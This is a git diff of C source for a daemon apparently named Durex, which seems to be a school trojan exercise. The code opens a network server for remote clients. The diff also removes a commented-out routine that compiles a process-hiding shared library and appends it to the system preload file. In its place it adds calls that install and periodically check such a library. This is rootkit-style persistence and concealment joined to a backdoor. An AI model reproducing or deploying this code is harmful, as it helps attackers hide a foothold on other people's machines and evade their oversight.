@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2018/08/13 00:42:00 by root             ###   ########.fr       */
+/*   Updated: 2018/08/14 01:54:55 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,10 +16,6 @@
 #include <stdio.h>
 /* exit */
 #include <stdlib.h>
-/* open */
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
 /* getpwuid */
 #include <sys/types.h>
 #include <pwd.h>
@@ -29,13 +25,13 @@
 #include "main.h"
 #include "durex.h"
 
-static void			cleanEnvironement()
+static void			cleanStructure()
 {
 	e.lock = -1;
 	e.server.reporter = -1;
 	e.server.fd = -1;
-	memset(&e.server.fdr, 0, sizeof(e.server.fdr));
-	memset(&e.server.fdw, 0, sizeof(e.server.fdw));
+	mymemset(&e.server.fdr, 0, sizeof(e.server.fdr));
+	mymemset(&e.server.fdw, 0, sizeof(e.server.fdw));
 	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
 		clearClient(&e.server.client[i]);
 }
@@ -51,11 +47,6 @@ static int			launch_program()
 		signal(i, &durexSigterm);
 	}
 	return 1;
-}
-
-static int			hireReporter()
-{
-	return open(SERVER_REPORTER, O_CREAT | O_TRUNC | O_RDWR, 0600);
 }
 
 static int			setupSelect()
@@ -81,64 +72,20 @@ static int			setupSelect()
 	return max;
 }
 
-/* static void		check_hide_binary() */
-/* { */
-/* 	static time_t		t = 0; */
-/* 	struct stat	s; */
-/* 	int			fd; */
-/* 	size_t		ret; */
-/* 	FILE		*f; */
-/* 	char		*line; */
-
-/* 	if (time(NULL) - t > DUREX_PROCESSHIDER_CHECK_TIME) { */
-/* 		t = time(NULL); */
-/* 		if (stat(DUREX_PROCESSHIDER_LIB, &s) < 0) { */
-/* 			serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present. Recreating it..."); */
-/* 			fd = open(DUREX_PROCESSHIDER_FIL, O_CREAT | O_TRUNC | O_WRONLY, 0644); */
-/* 			if (fd < 0) */
-/* 				return ; */
-/* 			ret = write(fd, DUREX_PROCESSHIDER_SCR, sizeof(DUREX_PROCESSHIDER_SCR) - 1); */
-/* 			close(fd); */
-/* 			if (ret != sizeof(DUREX_PROCESSHIDER_SCR) - 1) { */
-/* 				remove(DUREX_PROCESSHIDER_FIL); */
-/* 				return ; */
-/* 			} */
-/* 			system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB" "DUREX_PROCESSHIDER_FIL" -ldl"); */
-/* 			remove(DUREX_PROCESSHIDER_FIL); */
-/* 		} */
-/* 		f = fopen(DUREX_PRELOAD, "a+"); */
-/* 		if (f == NULL) */
-/* 			return ; */
-/* 		while (1) { */
-/* 			line = NULL; */
-/* 			ret = 0; */
-/* 			ssize_t ret2 = getline(&line, &ret, f); */
-/* 			if (ret2 <= 0) */
-/* 				break ; */
-/* 			if (strstr(line, DUREX_PROCESSHIDER_LIB)) */
-/* 				return ; // lib in file, all OK ! */
-/* 			free(line); */
-/* 		} */
-/* 		serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present in "DUREX_PRELOAD". Fixing it!"); */
-/* 		fwrite(DUREX_PROCESSHIDER_LIB, 1, sizeof(DUREX_PROCESSHIDER_LIB), f); */
-/* 		fwrite("\n", 1, 1, f); */
-/* 		fclose(f); */
-/* 	} */
-/* } */
-
 void				durex()
 {
 	int				maxfd;
 	int				ret;
 	struct timeval	timeout;
 
-	cleanEnvironement();
+	cleanStructure();
+	install_library();
 	if (launch_program()) {
 		e.server.reporter = hireReporter();
-		serverLog(e.server.reporter, "Reporter Hired.");
+		serverLog("[LOGS] - Opening Server...");
 		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
-		serverLog(e.server.reporter, "Server Opened.");
-		memset(&timeout, 0, sizeof(timeout));
+		serverLog("[LOGS] - Waiting for connections...");
+		mymemset(&timeout, 0, sizeof(timeout));
 		while (1)
 		{
 			maxfd = setupSelect();
@@ -156,14 +103,15 @@ void				durex()
 				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
 					serverWriteClient(&e.server.client[i]);
 			}
-//			check_hide_binary();
+			check_library();
 		}
+		uninstall_library();
 		quitClearlyServer();
 		quitClearlyDaemon();
 	}
 	struct passwd	*passwd;
 	passwd = getpwuid(getuid());
-	write(STDIN_FILENO, passwd->pw_name, strlen(passwd->pw_name));
+	write(STDIN_FILENO, passwd->pw_name, mystrlen(passwd->pw_name));
 	write(STDIN_FILENO, "\n", 1);
 }
 
